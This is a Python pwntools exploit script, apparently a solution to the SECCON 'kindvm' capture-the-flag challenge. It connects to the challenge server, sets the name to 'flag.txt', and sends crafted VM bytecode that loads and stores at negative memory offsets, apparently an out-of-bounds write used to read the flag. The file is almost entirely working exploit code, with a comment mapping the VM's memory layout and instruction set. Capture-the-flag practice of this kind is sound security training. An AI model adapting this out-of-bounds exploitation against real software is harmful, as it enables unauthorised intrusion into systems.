from pwn import *
from ctypes import *

address = 'kindvm.pwn.seccon.jp'
port = 12345
binary = './kindvm'

context.aslr = False
context.binary = binary
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'DEBUG'


# env={'LD_PRELOAD':lib}
# p = process(binary)
p = remote(address, port)
e = ELF(binary)

def s(a): return p.send(a)
def sa(a,b): return p.sendafter(a,b)
def sl(a): return p.sendline(a)
def sla(a,b): return p.sendlineafter(a, b)


def r(a): return p.recv(a)
def rl(): return p.recvline()
def ru(a): return p.recvuntil(a)

def i(ss):
    log.info("%s: 0x%x" % (ss, eval(ss)))

'''
0x0804c010 ~ 0x804c01c (kc)
0x804c028 ~ 0x804c030 (mem)
0x804c038 ~  
[0x18][0x10][0x400][0x20]
kc     mem    reg

load(regnum, memaddr): mem[addr] -> reg
store(regnum, memaddr) : reg -> mem[addr]
mov(regnum1, regnum2): reg2 -> reg1
add(regnum1, regnum2): reg1 = reg1 + reg2
sub(regnum1, regnum2): reg1 = reg1 - reg2
halt
in(reg1, value) : value -> reg1
out(reg1) -> print(reg1)
'''

sla('name : ', 'flag.txt')
inst = ''
inst += '\x01'
inst += '\x00'
inst += '\xff\xd8'
inst += '\x08\x00'
inst += '\x02'
inst += '\xff\xdc'
inst += '\x00'
inst += '\x06'
sla('instruction : ', inst)


p.interactive()
